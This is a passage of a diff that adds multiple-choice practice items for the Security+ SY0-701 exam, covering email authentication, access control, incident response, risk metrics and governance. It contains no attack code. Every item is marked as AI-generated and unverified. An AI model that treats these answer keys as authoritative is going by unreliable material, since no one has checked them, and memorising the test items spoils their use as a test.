+    "explanation": "Alert tuning adjusts thresholds, exclusions, or conditions so that known benign activity stops flooding analysts, which reduces alert fatigue without losing visibility into real threats. Disabling log collection would create a blind spot. Longer retention and archiving affect how long data is kept, not how many alerts fire.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0208",
+    "domain": "4.0",
+    "objective": "4.5",
+    "question": "Which email authentication mechanism adds a digital signature to message headers so that a receiving server can use a public key published in DNS to verify the message was not altered and came from the signing domain?",
+    "choices": {
+      "a": "SPF",
+      "b": "DMARC",
+      "c": "DKIM",
+      "d": "S/MIME"
+    },
+    "answer": "c",
+    "explanation": "DomainKeys Identified Mail (DKIM) signs outgoing messages with a private key and publishes the matching public key in DNS for verification. SPF lists which servers are allowed to send mail for a domain but does not sign messages. DMARC tells receivers how to handle SPF and DKIM failures, and S/MIME is user-level email signing and encryption using certificates rather than DNS-published domain keys.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0209",
+    "domain": "4.0",
+    "objective": "4.6",
+    "question": "A hospital grants access to patient records only when a user's job title is nurse, the user is assigned to the same ward as the patient, and the request comes from a hospital-managed device during the user's shift. Which access control model does this describe?",
+    "choices": {
+      "a": "Discretionary access control",
+      "b": "Mandatory access control",
+      "c": "Role-based access control",
+      "d": "Attribute-based access control"
+    },
+    "answer": "d",
+    "explanation": "Attribute-based access control (ABAC) evaluates many attributes of the user, resource, and environment, such as job title, ward, device, and time, to make each decision. RBAC grants permissions based on role alone and would not consider ward or device. DAC lets resource owners decide who has access, and MAC relies on classification labels and clearances set by the system.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0210",
+    "domain": "4.0",
+    "objective": "4.6",
+    "question": "An auditor finds that twelve IT staff members have permanent domain administrator rights. Which privileged access management practices would best reduce this risk? (Choose two.)",
+    "choices": {
+      "a": "Granting administrator rights just in time for an approved task and removing them automatically afterward",
+      "b": "Storing privileged credentials in a vault that checks them out, logs use, and rotates them",
+      "c": "Replacing individual administrator accounts with one shared administrator account",
+      "d": "Extending the password expiration period for administrator accounts"
+    },
+    "answer": [
+      "a",
+      "b"
+    ],
+    "explanation": "Just-in-time access removes standing privileges so admin rights exist only while needed, and credential vaulting controls, records, and rotates privileged passwords. A shared administrator account destroys accountability because actions cannot be tied to a person. Longer password expiration increases the time a stolen credential stays useful.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0211",
+    "domain": "4.0",
+    "objective": "4.7",
+    "question": "A company is considering a security orchestration platform that will automatically disable accounts and open tickets when certain alerts fire. Which are risks or drawbacks of this automation? (Choose two.)",
+    "choices": {
+      "a": "The platform can become a single point of failure for response workflows",
+      "b": "Custom scripts and integrations can build up technical debt that is hard to maintain",
+      "c": "Responses to common alerts will happen faster",
+      "d": "Baseline actions will be applied consistently every time"
+    },
+    "answer": [
+      "a",
+      "b"
+    ],
+    "explanation": "If the orchestration platform fails, every workflow that depends on it fails too, and growing collections of custom scripts create technical debt and complexity. Faster reaction time and consistent enforcement of baselines are benefits of automation, not drawbacks.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0212",
+    "domain": "4.0",
+    "objective": "4.8",
+    "question": "The legal department notifies IT that the company expects to be sued by a former contractor. IT is told to suspend automatic deletion of that contractor's email and file shares until further notice. What is this instruction called?",
+    "choices": {
+      "a": "Chain of custody",
+      "b": "Legal hold",
+      "c": "E-discovery",
+      "d": "Data retention policy"
+    },
+    "answer": "b",
+    "explanation": "A legal hold requires an organization to preserve potentially relevant data, overriding normal deletion schedules, when litigation is pending or reasonably expected. Chain of custody documents who handled evidence and when. E-discovery is the later process of finding and producing the electronic data, and a data retention policy sets the normal schedule that the hold overrides.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0213",
+    "domain": "4.0",
+    "objective": "4.8",
+    "question": "No alerts have fired, but after reading a threat intelligence report about a group that abuses scheduled tasks for persistence, an analyst searches endpoint data across the company for unusual scheduled tasks. Which activity is the analyst performing?",
+    "choices": {
+      "a": "Root cause analysis",
+      "b": "Threat hunting",
+      "c": "Tabletop exercise",
+      "d": "Lessons learned review"
+    },
+    "answer": "b",
+    "explanation": "Threat hunting is a proactive, often hypothesis-driven search for attacker activity that existing tools have not alerted on. Root cause analysis and lessons learned reviews happen after an incident to find why it occurred and how to improve. A tabletop exercise is a discussion-based walkthrough of a simulated scenario, not a search of real data.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0214",
+    "domain": "4.0",
+    "objective": "4.9",
+    "question": "During an investigation, an analyst needs to confirm whether outbound connections from an internal workstation to a known malicious IP address on TCP port 443 were permitted or blocked at the network perimeter. Which data source should the analyst check first?",
+    "choices": {
+      "a": "Firewall logs",
+      "b": "Vulnerability scan reports",
+      "c": "Application logs from the workstation's word processor",
+      "d": "Windows security logs on the domain controller"
+    },
+    "answer": "a",
+    "explanation": "Perimeter firewall logs record source, destination, port, and whether each connection was allowed or denied. Vulnerability scans show weaknesses, not traffic history. Application logs from a local program and domain controller security logs record application events and authentication, not the perimeter's handling of outbound traffic.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0215",
+    "domain": "5.0",
+    "objective": "5.1",
+    "question": "A document gives help desk staff numbered, step-by-step instructions for resetting a user's MFA enrollment, including how to verify the caller's identity before making any change. Which type of governance document is this?",
+    "choices": {
+      "a": "Policy",
+      "b": "Standard",
+      "c": "Procedure",
+      "d": "Guideline"
+    },
+    "answer": "c",
+    "explanation": "A procedure describes the specific, ordered steps for carrying out a task. A policy states high-level management intent, and a standard defines mandatory requirements such as specific technologies or settings. A guideline offers recommendations that are not mandatory.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0216",
+    "domain": "5.0",
+    "objective": "5.1",
+    "question": "A database administrator runs nightly backups of the HR database, maintains its encryption, and grants access only as approved by the HR director, who decides how the data is classified. Which role does the database administrator hold for this data?",
+    "choices": {
+      "a": "Data owner",
+      "b": "Data custodian",
+      "c": "Data controller",
+      "d": "Data subject"
+    },
+    "answer": "b",
+    "explanation": "A data custodian (or steward) handles the day-to-day technical care of data, such as backups, encryption, and applying approved access. The HR director is the data owner, accountable for classification and access decisions. The controller is the organization that decides why and how personal data is processed, and data subjects are the employees the records describe.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0217",
+    "domain": "5.0",
+    "objective": "5.4",
+    "question": "Under privacy regulations such as GDPR, a retailer hires a cloud email marketing company to send newsletters to the retailer's customers. The marketing company uses the customer data only as instructed by the retailer. What is the marketing company's role?",
+    "choices": {
+      "a": "Data controller",
+      "b": "Data processor",
+      "c": "Data owner",
+      "d": "Data subject"
+    },
+    "answer": "b",
+    "explanation": "A data processor handles personal data on behalf of, and according to the instructions of, the data controller. The retailer is the controller because it decides the purpose and means of processing. Data owner is an internal accountability role, and the customers are the data subjects.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0218",
+    "domain": "5.0",
+    "objective": "5.2",
+    "question": "A warehouse valued at $200,000 is in a flood zone. A flood is expected to damage 25 percent of the warehouse's value, and floods are expected once every five years. What is the annualized loss expectancy (ALE)?",
+    "choices": {
+      "a": "$10,000",
+      "b": "$40,000",
+      "c": "$50,000",
+      "d": "$250,000"
+    },
+    "answer": "a",
+    "explanation": "The single loss expectancy is $200,000 x 0.25 = $50,000, and the annualized rate of occurrence for once every five years is 0.2, so ALE = $50,000 x 0.2 = $10,000. The $50,000 figure is only the SLE, $40,000 wrongly applies the ARO to the full asset value, and $250,000 multiplies the SLE by 5 instead of 0.2.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0219",
+    "domain": "5.0",
+    "objective": "5.2",
+    "question": "During business continuity planning, the finance department states it can tolerate losing no more than two hours of transaction data if its database fails. Which metric does this define?",
+    "choices": {
+      "a": "Recovery time objective (RTO)",
+      "b": "Recovery point objective (RPO)",
+      "c": "Mean time to repair (MTTR)",
+      "d": "Mean time between failures (MTBF)"
+    },
+    "answer": "b",
+    "explanation": "The RPO is the maximum acceptable amount of data loss, measured back in time from the failure, and it drives how often backups or replication must occur. The RTO is how long the system can be down before it must be restored. MTTR is the average time to fix a failed component, and MTBF is the average time a component runs between failures.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0220",
+    "domain": "5.0",
+    "objective": "5.2",
+    "question": "After a risk assessment, a company decides not to launch a planned one-click checkout feature that would have required storing customers' full payment card numbers. Checkout continues to work as it does today, and the company never stores card numbers. Which risk response did the company choose for the risk of storing card data?",
+    "choices": {
+      "a": "Avoid",
+      "b": "Accept",
+      "c": "Mitigate",
+      "d": "Transfer"
+    },
+    "answer": "a",
+    "explanation": "Avoiding a risk means stopping or never starting the activity that creates it, and the company dropped the feature so card numbers are never stored. Accepting would mean storing the data and taking on the risk as is, and mitigating would mean storing it with added controls such as encryption. Transferring shifts the risk or its financial impact to another party, such as an insurer or an outsourcing provider, but here no party takes on stored card data because none is stored.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0221",
+    "domain": "5.0",
+    "objective": "5.2",
+    "question": "Which activity identifies an organization's mission-essential functions, estimates the operational and financial impact if they are disrupted, and provides the inputs used to set recovery time and recovery point objectives?",
+    "choices": {
+      "a": "Business impact analysis",
+      "b": "Vulnerability assessment",
+      "c": "Tabletop exercise",
+      "d": "Risk register review"
+    },
+    "answer": "a",
+    "explanation": "A business impact analysis (BIA) determines which processes are critical and what a disruption would cost, which is the basis for RTO and RPO targets. A vulnerability assessment looks for technical weaknesses. A tabletop exercise tests a response plan through discussion, and a risk register tracks identified risks, owners, and responses.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0222",
+    "domain": "5.0",
+    "objective": "5.3",
+    "question": "A company is negotiating with a managed service provider that will host sensitive customer data. The company wants the contractual ability to inspect the provider's security controls or have an independent assessor do so. Which contract provision should it include?",
+    "choices": {
+      "a": "Right-to-audit clause",
+      "b": "Non-disclosure agreement",
+      "c": "Memorandum of understanding",
+      "d": "Service-level agreement"
+    },
+    "answer": "a",
+    "explanation": "A right-to-audit clause gives the customer the contractual right to examine, or have a third party examine, a vendor's security practices and compliance. An NDA requires the parties to keep shared information confidential. An MOU is a generally non-binding statement of intent, and an SLA sets measurable service levels such as uptime and response times.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0223",
+    "domain": "5.0",
+    "objective": "5.5",
+    "question": "A penetration tester is in the passive reconnaissance phase and must avoid sending any traffic to the target's systems. Which activities are appropriate? (Choose two.)",
+    "choices": {
+      "a": "Reviewing the target's public job postings for the technologies it uses",
+      "b": "Searching public WHOIS registration records for the target's domains",
+      "c": "Running a ping sweep against the target's public IP range",
+      "d": "Connecting to the target's web server to collect service banners"
+    },
+    "answer": [
+      "a",
+      "b"
+    ],
+    "explanation": "Passive reconnaissance gathers information from public sources, such as job postings and WHOIS records, without interacting directly with the target's systems. A ping sweep and banner grabbing both send traffic to the target, which makes them active reconnaissance that could be detected.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0224",
+    "domain": "5.0",
+    "objective": "5.6",
+    "question": "In a simulated phishing campaign, 18 percent of employees clicked the link and only 3 percent reported the message to the security team. What is the most appropriate next step for the awareness program?",
+    "choices": {
+      "a": "Disable the accounts of employees who clicked the link",
+      "b": "Publish the names of employees who clicked to encourage better behavior",
+      "c": "Provide targeted training on recognizing and reporting phishing, then run follow-up campaigns to measure improvement",
+      "d": "Stop the simulations because they reduce employee trust"
+    },
+    "answer": "c",
+    "explanation": "Phishing simulations are meant to measure behavior and guide training, so targeted training on spotting and reporting phishing, followed by recurring campaigns, addresses both weak results. Disabling accounts and publicly naming employees are punitive and discourage reporting. Stopping the simulations removes the main way to measure progress.",
     "source": "ai-generated",
     "verified": false
   }
